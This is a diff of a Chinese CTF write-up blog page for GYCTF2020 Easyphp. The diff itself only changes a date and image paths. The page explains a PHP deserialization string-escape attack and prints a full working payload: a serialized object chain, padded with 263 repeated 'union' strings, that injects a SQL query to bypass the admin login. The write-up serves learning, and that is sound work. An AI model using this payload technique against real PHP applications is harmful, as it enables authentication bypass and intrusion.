@@ -584,7 +584,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-08-24
+                    2022-01-28
                 </div>
                 
 
@@ -618,15 +618,15 @@
             <div id="articleContent">
                 <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[反序列化字符串逃逸]</p>
 <p>十分复杂且经典的例题，需要多回顾。</p>
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/image-20210804163917142.png"></p>
+<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/image-20210804163917142.png"></p>
 <h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>随便打，提示用户不存在</p>
 <p>输入admin，提示密码错误，那么用户名应该就是admin了，先爆破一下</p>
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/image-20210804164308537.png"></p>
+<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/image-20210804164308537.png"></p>
 <p>提示被检测到了，那可能是sql注入。</p>
 <p>老规矩，fuzz一下</p>
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/image-20210804170802180.png"></p>
+<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/image-20210804170802180.png"></p>
 <p>随手试了试<a target="_blank" rel="noopener" href="http://www.zip,得,源码泄漏/">www.zip，得，源码泄漏</a></p>
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/image-20210804204402692.png"></p>
+<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/image-20210804204402692.png"></p>
 <p>可见只要登录成功，就能拿flag</p>
 <h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p>lib.php</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
@@ -794,14 +794,14 @@
 <pre class="line-numbers language-none"><code class="language-none">O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>这个反序列化只能通过实例化类的时候传值，</p>
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/image-20210804234737377.png"></p>
+<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/image-20210804234737377.png"></p>
 <p>但它的实参是不可控的，所以这个反序列化没法用。</p>
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/image-20210804234931741.png"></p>
+<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/image-20210804234931741.png"></p>
 <p>还好这<code>User</code>还有个反序列化，而且是可控的。</p>
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/image-20210804235144278.png"></p>
+<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/image-20210804235144278.png"></p>
 <p>按程序的逻辑，传入的只是字符串，没法利用，所以需要进行字符串逃逸，把字符串”升格“为对象。</p>
 <p>可以利用这个进行字符串逃逸</p>
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/image-20210805232159045.png"></p>
+<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/image-20210805232159045.png"></p>
 <p>Info类</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token keyword">class</span> <span class="token class-name-definition class-name">Info</span><span class="token punctuation">&#123;</span>
@@ -832,15 +832,15 @@
 
 <p>之后利用反序列化字符串逃逸，union-&gt;hacker，增加一个字符，意味着可逃一个字符。</p>
 <p>上方的payload长度是263，意味着要逃263个字符，那就是263个union。</p>
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/20200329134813769.png" alt="20200329134813769"></p>
+<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/20200329134813769.png" alt="20200329134813769"></p>
 <p>放个payload</p>
 <pre class="line-numbers language-none"><code class="language-none">age&#x3D;1&amp;nickname&#x3D;unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>Q：已经设置好<code>$_SESSION[&#39;token&#39;]</code>为admin了，为什么登录的时候用户名必须为admin？测试了下输入随便输入其他账号密码，不会提示用户不存在/密码错误，就很奇怪。</p>
 <p>A：想了一会，有答案了，因为不知道其他正常的用户名，<code>select id,password from user where username=?</code>没有正常返回值，但又因为token为admin，导致直接return，</p>
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/image-20210807011234334.png"></p>
+<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/image-20210807011234334.png"></p>
 <p>然后id是空的，在这就啥都没发生了。</p>
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/image-20210807011308616.png"></p>
+<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-Easyphp/image-20210807011308616.png"></p>
 
                 
             </div>
